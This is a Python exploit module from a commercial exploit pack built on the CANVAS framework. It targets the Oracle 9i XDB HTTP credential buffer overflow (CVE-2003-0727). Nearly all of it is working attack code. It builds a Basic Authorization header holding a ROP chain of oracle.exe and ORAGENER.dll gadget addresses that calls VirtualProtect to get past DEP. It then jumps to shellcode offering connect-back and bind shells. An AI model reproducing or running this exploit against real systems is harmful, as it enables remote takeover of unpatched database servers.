
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

######################################################################################
NAME="Oracle XDB HTTP Pass Overflow"
DESCRIPTION="Exploits a buffer overflow vulnerability in the parsing of credentials sent to the HTTP service."
VERSION='1.0'
CHANGELOG="""
"""
######################################################################################
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Oracle"
DOCUMENTATION['References']="""
http://otn.oracle.com/deploy/security/pdf/2003Alert58.pdf
http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf
http://www.appsecinc.com/resources/alerts/oracle/2003-0005.html"""
DOCUMENTATION['Repeatability']='Multiple'
DOCUMENTATION['CVE Name']='CVE-2003-0727'
DOCUMENTATION['Notes']="""
This exploit uses address local to the Oracle 9i Release 2 binaries.
This allows it to work against all versions of windows, bypassing DEP /alwayson.
"""
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']
NOTES=""""""
PORT = 8080
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows (All Versions)", (0x00000000), []]
}


#################################################m#####################################
class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
            "IE Inject Connect Back",
            "Bind MOSDEF Shell",
            "Execute Command"]

    DEFAULT_PAYLOAD = 0
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        # set default version
        self.version = 0
        
        self.port=PORT
        self.host=""
        self.shellcode=""

        self.badstring="\x00\x09\x0a\x0d\x20\x25\x26\x2b"

        return

    def usage(self):
        self.wp_usage(targets,"")
        return  
    
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return    

    def test(self):
        # Simple test
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.log('WP> Checking http banner')
        ret = wp_bannerchecktest(self,self.host,self.port,{"Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0": 1})
              
        return ret

    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()
       
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
    
        return
    
    def run(self):
        self.getArgs()

        self.setInfo("WP> %s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
       
        # Build the exploit
        exploit = "GET / HTTP/1.1\r\n"
        exploit += "Host: %s:%s\r\n" %(self.host,self.port)
        exploit += "Authorization: Basic %s\r\n" % b64encode(self.makesploit())
        exploit += "\r\n";
        
        try:
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.log( "WP> Connected")
            s.set_timeout(20)
            self.log("WP> Sending exploit string")
            s.sendall( "%s" % exploit)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
     
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        ret = self.wp_postExploitShellcode(s)
        if ret:
            return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret
        
    def makesploit(self):
        """
        Construct the attack
        """
   
        # DEP Disabling shellcode that uses address in Oracle binaies.
        # Works against all versions of Windows
        sploitstring = "test:"
        sploitstring += "\x90" * 442            # spacer
        sploitstring += "\x23\xa5\x54\x01"      # oracle.exe    - Stack Control  
        sploitstring += "\xc8\x9f\x71\x02"      # ORAGENER.dll  - Control Start 
        sploitstring += "\x08\xcf\x6b\x02"      # ORAGENER.dll  - POP EDI,ESI
        sploitstring += "\xB7\xDF\xFF\xFF"      # Value2 0xFFFFDFB7
        sploitstring += "\xFF\xFF\xFF\xFF"      # Value1 0xFFFFFFFF
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x87\x80\x3b\x01"      # oracle.exe    - Subtract values
        sploitstring += "\x06\xcf\x6b\x02"      # ORAGENER.dll  - Mov EDX,ESI
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x62\xb5\x6b\x02"      # ORAGENER.dll  - Mov EAX,40
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer        
        sploitstring += "\x25\xd2\x19\x01"      # oracle.exe    - Mov ESI,EAX
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x4a\xdb\x76\x02"      # ORAGENER.dll  - POP EAX, POP EBX
        sploitstring += "\xb0\x07\x82\x02"      # EAX Writeable
        sploitstring += "\xb0\x07\x82\x02"      # EBX Writeable     
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\xca\xaf\x78\x02"      # ORAGENER.dll  - VirtualProtect
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x90\x90\x90\x90"      # spacer
        sploitstring += "\x5d\x13\x04\x01"      # oracle.exe    - JMP ESP            
        sploitstring += "\x90" * 140            # spacer
        sploitstring += "\xeb\x22"              # jmp over bad bytes
        sploitstring += "\x90" * 40             # spacer
        sploitstring += self.shellcode          # shellcode

        return sploitstring
    
if __name__ == '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

